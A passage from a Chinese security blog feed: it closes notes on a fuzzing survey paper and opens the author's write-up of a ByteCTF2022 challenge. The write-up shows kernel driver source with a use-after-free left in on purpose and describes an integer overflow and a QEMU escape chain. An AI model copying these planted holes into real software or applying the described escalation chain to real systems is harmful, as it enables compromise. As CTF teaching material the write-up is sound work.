href="https://ieeexplore.ieee.org/document/9284141/">MemLock</a>：通过边覆盖率与内存消耗来检测 AC 漏洞</li><li><a href="https://dl.acm.org/doi/10.1145/3236024.3236039">Singularity</a>：基于 <em>最坏表现输入</em> （我认识他 performance input，WPI）总是遵循某种特定模式来合成输入生成程序</li></ul></blockquote><h3 id="5-2-4-Spectre-type-Bugs"><a href="#5-2-4-Spectre-type-Bugs" class="headerlink" title="5.2.4 Spectre-type Bugs"></a>5.2.4 Spectre-type Bugs</h3><p><strong>幽灵型漏洞</strong>（Spectre-type Bugs）是一种利用错误分支预测（mispredicted branch speculations）来控制内存访问的微架构攻击，例如在 Fig.10 中攻击者可以利用有效值来训练分支预测为真，随后给变量一个 OOB 的值，此时预测器便会错误预测分支行为，从而错误地执行了第3、4行代码，造成了越界读取</p><p><img src="https://s2.loli.net/2022/10/30/LJsx8WOUQyP2koA.png" alt="Fig. 10. Spectre-type bug"></p><blockquote><p>论文给出了这个例子：<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/oleksenko">SpecFuzz</a>，<del>不过在笔者看来噱头大于实际</del></p></blockquote><h3 id="5-2-5-Side-channels"><a href="#5-2-5-Side-channels" class="headerlink" title="5.2.5 Side channels"></a>5.2.5 Side channels</h3><p><strong>侧信道漏洞</strong>（side-channel）通过对系统的非功能性表现（例如执行时间）来泄露信息，例如通过分支执行时间判断执行的分支</p><blockquote><p>论文没给例子，那笔者给出一个例子：<a href="https://gruss.cc/files/prefetch.pdf">prefetch side-channel attack: bypassing SMAP and KASLR</a></p></blockquote><p><strong>JIT-induced side channels</strong>（<del>不懂咋翻</del>）是一种由即时优化（Just-In-Time Optimization）导致的特殊侧信道，类似于幽灵型漏洞，通过训练 JIT 编译器优化单一分支以使得两执行分支间执行时间差大到可以被观测到</p><h3 id="5-2-6-Integer-Bugs"><a href="#5-2-6-Integer-Bugs" class="headerlink" title="5.2.6 Integer Bugs"></a>5.2.6 Integer Bugs</h3><p><strong>整型上溢&#x2F;下溢</strong>（Integer Overflow&#x2F;Underflow）在算术表达式的值超过机器类型所决定的范围时发生，或是在整型间转换时发生（比如 int to uint）</p><blockquote><p>论文举了这个例子：<a href="https://dl.acm.org/doi/10.5555/1855768.1855773">SmartFuzz</a></p></blockquote><h2 id="5-3-Improvement-of-Execution-Speed"><a href="#5-3-Improvement-of-Execution-Speed" class="headerlink" title="5.3 Improvement of Execution Speed"></a>5.3 Improvement of Execution Speed</h2><p>执行速度对模糊测试而言非常关键，更高的执行速度意味着在同一时间能跑更多测试用例，从而提高发现缺陷的机会</p><h3 id="5-3-1-Binary-Analysis"><a href="#5-3-1-Binary-Analysis" class="headerlink" title="5.3.1 Binary Analysis"></a>5.3.1 Binary Analysis</h3><p><strong>静态插桩</strong>（static instrumentation）是主流的获取执行状态的方式，因为其为 fuzzing 提供了更高的执行速度</p><ul><li><p>对开源程序而言，一个被广泛使用的静态分析工具是 <code>LLVM</code>，其在编译期进行插桩</p></li><li><p>对于闭源程序而言，fuzzer 被限制于二进制分析，但二进制插桩工具有着不菲的运行时开销</p><blockquote><p>论文给出了这些例子：</p><ul><li><a href="https://ieeexplore.ieee.org/document/9152762">RetroWrite</a> 使用基于可重汇编的汇编（reassembleable assembly）的静态二进制重写技术，其关注于使用 64 位的 <em>地址无关代码</em> （position independent code，PIC）的重定位信息来插桩汇编程序</li><li><a href="https://www.usenix.org/conference/usenixsecurity21/presentation/nagy">FIBRE</a> 通过四个修改中间表示的阶段（IR-modifying phase）来流水线化插桩</li><li><a href="https://ieeexplore.ieee.org/document/9519407">STOCHFUZZ</a> 通过多次重写来解决此前重写的遗留问题</li></ul></blockquote></li></ul><h3 id="5-3-2-Execution-Process"><a href="#5-3-2-Execution-Process" class="headerlink" title="5.3.2 Execution Process"></a>5.3.2 Execution Process</h3><p>执行速度同样可以在模糊测试过程中提升，例如 <a href="https://ieeexplore.ieee.org/document/8835316">UnTracer</a> 观测到大部分测试用例并不会带来新的覆盖率，由此其仅追踪会增加覆盖率的测试用例</p><blockquote><p>论文还给出这些例子：</p><ul><li><a href="https://ieeexplore.ieee.org/document/9139349/">CSI-Fuzz</a> 使用边覆盖率来改进 UnTracer，因为块覆盖率丧失了执行状态信息</li><li><a href="https://ieeexplore.ieee.org/document/9286017">Zeror</a> 通过在 UnTracer  插桩与 AFL 插桩间切换来改进 UnTracer</li></ul></blockquote><p>对于混合模糊测试，混合执行被用以求解路径约束，但符号执行在表示路径约束上较慢，<a href="">QSYM</a> 通过移除一些耗时的内容（IR 翻译、快照等）来缓解性能瓶颈</p><blockquote><p>论文还给出这些例子：</p><ul><li><a href="https://dl.acm.org/doi/10.1145/3319535.3354249">Intriguer</a> 观测到 QSYM 仍求解不必要约束导致的性能评价，因此其使用符号执行由动态污点分析确认的更相关指令</li><li><a href="https://dl.acm.org/doi/10.1145/3133956.3134046">Xu</a> 发现 AFL 在并行跑 120 核时显著变慢，故其设计了新的操作原语（operating primitives）来提升执行速度</li></ul></blockquote><h3 id="5-3-3-Various-Applications"><a href="#5-3-3-Various-Applications" class="headerlink" title="5.3.3 Various Applications"></a>5.3.3 Various Applications</h3><p>模糊测试被用以检测多种目标中的缺陷，如 IoT、OS kernel、VMM 等，需要根据目标特性进行客制化</p><blockquote><p>论文给出这些例子：</p><ul><li><a href="https://www.usenix.org/conference/usenixsecurity19/presentation/zheng">FIRM-AFL</a> 通过结合用户态模拟与全系统模拟来缓解传统 IOT 固件 fuzzing 中全系统模拟带来的虚拟地址与内存访问间翻译及模拟系统调用的开销</li><li>Schumilo 设计了一种<a href="https://www.ndss-symposium.org/ndss-paper/hyper-cube-high-dimensional-hypervisor-fuzzing/">客制化 OS</a> 与<a href="https://www.usenix.org/conference/usenixsecurity21/presentation/schumilo">快速快照存储机制</a></li><li>。。。</li></ul></blockquote><blockquote><p><strong>Gap 3</strong>：对应用的自动化执行基于对其的深入理解，在设计自动记录安全缺陷的 indicators 时需要首先研究这些缺陷的特性</p></blockquote><h1 id="0x06-DIRECTIONS-OF-FUTURE-RESEARCH"><a href="#0x06-DIRECTIONS-OF-FUTURE-RESEARCH" class="headerlink" title="0x06. DIRECTIONS OF FUTURE RESEARCH"></a>0x06. DIRECTIONS OF FUTURE RESEARCH</h1><p>本节总结了 fuzzing 未来的研究方向</p><ul><li><strong>More sensitive fitness</strong>：研究人员意识到代码覆盖在发现复杂漏洞上存在局限性，因此其通过引入由分析漏洞获得的信息来改进代码覆盖。未来的工作可以是基于漏洞特性分析与检测漏洞，尤其是分析那些 fuzzing 未分析出的漏洞</li><li><strong>More sophisticated fuzzing theory</strong>：绝大部分现有的工作都致力于种子调度上，仅少部分工作关注于 fuzzing 的其他过程。对整个模糊测试过程进行数学化构建并非小事，但构建多余一个模糊测试过程是可能的，例如 Game Theory 便同时考虑了种子调度与字节调度。一个更大的图景是关于模糊测试的理论局限（例如灰盒模糊测试的局限）。另一方面，使用多种类型的 fitness 构建 fuzzing 过程是另一种创建更先进 fuzzing 理论的方式，例如未来的工作可能构建同时考虑漏洞出现与状态转移的 fuzzing 过程</li><li><strong>Sound evaluation</strong>：一部分工作关注于评估的可靠性（soundness of evaluation），但没有明确结论（§3.6），有更多的问题待我们解答：在评估语料库中该使用真实漏洞还是合成漏洞？静态测试是区分不同 fuzzing 技术的最终答案🐎？合理的 time budget 应当是？如何在没有其他可比较 fuzzer 的情况下评估特殊目标（如硬件）？</li><li><strong>Scalable input inference</strong>：若在 fuzzing 中能使用格式或数据依赖项则能显著提高 fuzzing 效率（§4.6&amp;§4.7），静态分析被广泛用于格式与数据依赖项推断，但其特定于特定程序，而推断方案的实现需要考虑不同应用的特性。动态分析关注于格式推断，仅少部分在数据依赖项推断上做了工作，而其比静态分析更可扩展（scalable）</li><li><strong>Efficient mutation operators</strong>：几乎所有 fuzzer 都在 fuzzing 中使用混合的变异器，但在 fuzzing 中并不会修改变异器（§4），一部分工作在优化变异器调度上，但没人关注于可变的变异器（§3.4）。由于变异器调度与字节调度紧密关联，可以考虑基于字节调度设计变异器。对高度结构化输入的变异器调度也值得研究</li><li><strong>More types of applications</strong>：由于应用的复杂性，fuzzing 在检测更多类型应用上有其局限，例如一部分工作探索了 fuzz CPSs 的可能性，但能力遭到了限制。由于执行速度对 fuzzing 而言很重要，因此对于难以被 fuzz 的程序而言，一个潜在的方向是提升他们的执行速度</li><li><strong>More types of bugs</strong>：fuzzing 在检测如内存破坏、并发漏洞、算法复杂性漏洞上取得良好成果（§5.2），但在检测其他类型漏洞（如权限提升或逻辑漏洞）上仍存在困难，难点在于如何设计合适的 indicator，这需要研究人员同时对 fuzzing 与目标漏洞有着深刻理解</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;模糊测试为什么是神&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【CTF.0x07】ByteCTF2022 byte_run 出题手记</title>
    <link href="https://arttnba3.github.io/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/"/>
    <id>https://arttnba3.github.io/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/</id>
    <published>2022-09-30T13:48:01.000Z</published>
    <updated>2022-11-23T18:45:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>前年👴当选手的时候还有⑤⭐级的带🏨住，今年当出题人👴只能喝西北风</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>作为一名安全研究员，笔者不知道为什么进了字节跳动当开发，于是就不知道为什么又跑去帮 ByteCTF 出题了（笑）</p><p>其实这道题最初的灵感来自于 Google CTF 2021 的一道名为 “fullchain” 的题目，那是一道 chrome v8 + mojo sandbox escape + kernel primitive 的题目，<strong>一条非常完整的利用链，笔者觉得非常帅气</strong>（笑）</p><p>笔者也一直想出一道比较「完整」（full chain）的题目，不过限于自身技术水平较低的缘故再加上这一次的出题时间比较短，于是只弄好了“后端利用”的部分——「Linux kernel提权」 + 「QEMU逃逸」</p><blockquote><p>“后端利用”是笔者临时生造的词，仅在这篇文章的开头表示「拿到了远端代码执行权限之后的利用部分」（笑）</p></blockquote><ul><li>kernel 部分的灵感来自于 CVE-2022-0847，也就是“dirty pipe”，笔者模仿内核的 pipe 结构自己写了一个简化版的 pipe，并留下了一个 UAF 漏洞</li><li>QEMU 部分则主要是一个提供存储功能的“块设备”，漏洞则是非常明显的整数溢出导致的越界读写</li></ul><p>在笔者看来整体难度其实并不算太大（因为当笔者开始出这道题目的时候出题时间已经所剩无几了，那时候其实没想出啥好的点子XD），所以在其他出题人都在文档里写“难度中等”的时候只有笔者一个人写了“难度简单”，从最终的解题情况来看的话 <em>这一次整个 pwn 的出题好像都不咋能吸引大佬来做……</em></p><p>本次题目源码已经全部开源：<a href="https://github.com/arttnba3/ByteCTF2022_PWN-ByteRun">https://github.com/arttnba3/ByteCTF2022_PWN-ByteRun</a></p><h1 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01.题目分析"></a>0x01.题目分析</h1><p>u1s1，这一次编译出来的代码再反汇编之后确实比较难看，哪怕是笔者作为出题人尝试逆了一下也没能在短时间内看明白整个题目的运行逻辑（笑）</p><h2 id="一、内核模块部分"><a href="#一、内核模块部分" class="headerlink" title="一、内核模块部分"></a>一、内核模块部分</h2><p>笔者一开始就想写一个功能上比较完整的设备驱动，于是包括与设备交互那一块的代码也集成在了内核模块中，不过在这里笔者设定了驱动存在着两种运行模式：流（stream）模式和块（block）模式，其中前者是与设备无关的管道功能部分，后者则是与设备交互的部分，但是后者的功能需要 root 权限才能开启，于是第一个任务就是内核提权；）</p><p>在模块初始化函数当中为 PCI 设备进行了相应的接口注册：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">bytedev_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-comment">/* register pci driver */</span><br>    <span class="hljs-keyword">return</span> pci_register_driver(&amp;bytedev_driver);<br>&#125;<br></code></pre></td></tr></table></figure><p>当一个新的 bytedev 设备插进来的时候，内核便会遍历接口比对 BTF，最后调用到我们的初始化函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_device_id</span> <span class="hljs-title">bytedev_ids</span>[] =</span> &#123;<br>    &#123; PCI_DEVICE(PCI_VENDOR_ID_BYTEDEV, PCI_DEVICE_ID_BYTEDEV) &#125;,<br>    &#123; <span class="hljs-number">0</span>, &#125;,<br>&#125;;<br><br>MODULE_DEVICE_TABLE(pci, bytedev_ids);<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_driver</span> <span class="hljs-title">bytedev_driver</span> =</span> &#123;<br>    .name       = <span class="hljs-string">&quot;bytedev&quot;</span>,<br>    .id_table   = bytedev_ids,<br>    .probe      = bytedev_pci_probe,<br>    .remove     = bytedev_pci_remove,<br>&#125;;<br></code></pre></td></tr></table></figure><p>对于每个插上来的 bytedev 类型的设备，驱动都会动态生成一个对应的结构 <code>bytedev</code>，并使用 <code>pci_request_regions()</code> 等函数进行资源的探测与占用，从而使得<strong>无法直接通过在用户态进程打开设备资源文件的方式与设备进行交互</strong>：</p><blockquote><p>其实可以通过提权后卸载内核模块的方式来重新实现直接通过设备资源文件与设备进行交互，但实际上在内核模块当中笔者早已封装好了所需要使用的接口（笑）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bytedev_pci_probe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pci_dev *pdev,</span><br><span class="hljs-params">                            <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pci_device_id *id)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">bdev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span>   *<span class="hljs-title">dev_node</span>;</span><br>    <span class="hljs-type">char</span> dname[BYTEDEV_DEVNAME_LENGTH];<br>    <span class="hljs-type">int</span> minor_num;<br>    <span class="hljs-type">int</span> err;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[bytedev:] ByteDance pci device detected!&quot;</span>);<br><br>    <span class="hljs-comment">/* alloc space for bytedev struct*/</span><br>    <span class="hljs-keyword">if</span> (!(bdev = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev), GFP_KERNEL))) &#123;<br>        err = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> err_no_mem;<br>    &#125;<br><br>    pci_set_drvdata(pdev, bdev);<br><br>    <span class="hljs-comment">/* enable the device */</span><br>    <span class="hljs-keyword">if</span> ((err = pci_enable_device(pdev))) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] Cannot enable PCI device, abort.&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_free_dev;<br>&#125;<br><br>    <span class="hljs-comment">/* check for MMIO flags on BAR 0 */</span><br>    <span class="hljs-keyword">if</span> (!(pci_resource_flags(pdev, <span class="hljs-number">0</span>) &amp; IORESOURCE_MEM)) &#123;<br>        printk(KERN_ERR <br>            <span class="hljs-string">&quot;[bytedev:] Cannot find PCI device base address for MMIO, abort.&quot;</span>);<br>        err = -ENODEV;<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* check for PMIO flags on BAR 1 */</span><br>    <span class="hljs-keyword">if</span> (!(pci_resource_flags(pdev, <span class="hljs-number">1</span>) &amp; IORESOURCE_IO)) &#123;<br>        printk(KERN_ERR <br>            <span class="hljs-string">&quot;[bytedev:] Cannot find PCI device base address for PMIO, abort.&quot;</span>);<br>        err = -ENODEV;<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* request for PCI bar spaces */</span><br>    <span class="hljs-keyword">if</span> ((err = pci_request_regions(pdev, DRV_NAME))) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;Cannot obtain PCI resources, abort.&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_disable_pdev;<br>    &#125;<br><br>    <span class="hljs-comment">/* iomap for mmio space */</span><br>    bdev-&gt;mmio_addr = pci_ioremap_bar(pdev, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!bdev-&gt;mmio_addr) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;Cannot ioremap for MMIO space, abort.&quot;</span>);<br>        err = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> err_out_free_region;<br>    &#125;<br><br>    <span class="hljs-comment">/* get I/O ports base */</span><br>    bdev-&gt;io_base = pci_resource_start(pdev, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* register device node */</span><br>    minor_num = bytedev_get_unused_minor_num();<br><br>    <span class="hljs-keyword">if</span> (minor_num &lt; <span class="hljs-number">0</span>) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] bytedev amount limits!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_out_iounmap_mmio;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (minor_num == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">snprintf</span>(dname, <span class="hljs-keyword">sizeof</span>(dname), <span class="hljs-string">&quot;%s&quot;</span>, DEVICE_NAME);<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">snprintf</span>(dname, <span class="hljs-keyword">sizeof</span>(dname), <span class="hljs-string">&quot;%s%d&quot;</span>, DEVICE_NAME, minor_num);<br>    &#125;<br><br>    dev_node = device_create(bytedev_class, <span class="hljs-literal">NULL</span>, <br>                            MKDEV(bytedev_major_num, minor_num), <br>                            <span class="hljs-literal">NULL</span>, dname);<br>    <span class="hljs-keyword">if</span> (IS_ERR(dev_node)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] Failed to create the device!&quot;</span>);<br>        err = PTR_ERR(dev_node);<br>        <span class="hljs-keyword">goto</span> err_out_unuse_minor;<br>    &#125;<br><br>    <span class="hljs-comment">/* other data init */</span><br>    spin_lock_init(&amp;bdev-&gt;dev_lock);<br>    <span class="hljs-built_in">memset</span>(bdev-&gt;data_queue, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*) * BYTEDEV_MAX_BUFS);<br>    bdev-&gt;head_idx = <span class="hljs-number">0</span>;<br>    bdev-&gt;tail_idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* info records */</span><br>    bdev-&gt;pdev = pdev;<br>    bdev-&gt;dev_node = dev_node;<br>    bdev-&gt;minor_num = minor_num;<br>    bytedev_arr[minor_num] = bdev;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[bytedev:] bytedev%d register complete.&quot;</span>, minor_num);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_out_unuse_minor:<br>    bytedev_set_unused_minor_num(minor_num);<br>err_out_iounmap_mmio:<br>    pci_iounmap(pdev, bdev-&gt;mmio_addr);<br>err_out_free_region:<br>    pci_release_regions(pdev);<br>err_out_disable_pdev:<br>    pci_disable_device(pdev);<br>err_out_free_dev:<br>    kfree(bdev);<br>err_no_mem:<br>    <span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>bytedev</code> 结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span>   *<span class="hljs-title">dev_node</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_dev</span>  *<span class="hljs-title">pdev</span>;</span><br>    <span class="hljs-type">int</span> minor_num;<br>    u64 __iomem  *mmio_addr;<br>    u64 io_base;<br><br>    <span class="hljs-type">spinlock_t</span> dev_lock;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">data_queue</span>[<span class="hljs-title">BYTEDEV_MAX_BUFS</span>];</span><br>    <span class="hljs-type">int</span> head_idx, tail_idx;<br>&#125;;<br></code></pre></td></tr></table></figure><p>对于流模式而言，其使用一个环形队列 <code>data_queue</code> 来实现进程间的数据传递，我们可以直接通过读写设备文件来实现对环形队列的数据读写，其本质上是一个如下结构的指针数组：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> len, offset;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>第一个漏洞便存在于读的过程当中，在读的过程中存在一个 UAF 漏洞，从而导致读取完数据后对应的 buffer 并没有被释放，但是在正常地对该功能的使用上并不会造成影响，因为 slub allocator 并不似 ptmalloc 那样恒定使用前 8 字节来存放 next free object，这使得其统计数据字段得以保留</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">bytedev_stream_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *f, </span><br><span class="hljs-params">                            <span class="hljs-type">char</span> __user *buf, </span><br><span class="hljs-params">                            <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">loff_t</span> *loff)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">dev</span> =</span> f-&gt;private_data;<br>    <span class="hljs-type">ssize_t</span> ret;<br>    <span class="hljs-type">ssize_t</span> rlen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (bytedev_queue_empty(dev)) &#123;<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span>;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left, clen;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * If the data queue is already empty,</span><br><span class="hljs-comment">         * just quit out is OK.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_empty(dev)) &#123;<br>            ret = rlen;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        d = dev-&gt;data_queue[dev-&gt;head_idx];<br>        left = d-&gt;len - d-&gt;offset;<br>        clen = left &gt; size ? size : left;<br><br>        ret = copy_to_user(buf + rlen, &amp;d-&gt;data[d-&gt;offset], clen);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while reading the buffer!&quot;</span>);<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        size -= clen;<br>        d-&gt;offset += clen;<br>        rlen += clen;<br><br>        <span class="hljs-keyword">if</span> (d-&gt;offset == d-&gt;len) &#123;<br>            <span class="hljs-keyword">if</span> (d-&gt;len == BYTEDEV_BUF_SIZE) &#123;<br>                kfree(d);<br>                <span class="hljs-comment">/* ther&#x27;s where we made our basic bug: a UAF */</span><br>                <span class="hljs-comment">//dev-&gt;data_queue[dev-&gt;head_idx] = NULL;</span><br>                dev-&gt;head_idx++;<br>                dev-&gt;head_idx %= BYTEDEV_MAX_BUFS;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ret = rlen;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    ret = rlen;<br><br>out:<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>第二个漏洞则存在于写的过程当中，在对统计数据字段的判定当中存在一个整型溢出漏洞，若是正常使用则仍不会触发这个漏洞，但若是我们可以通过 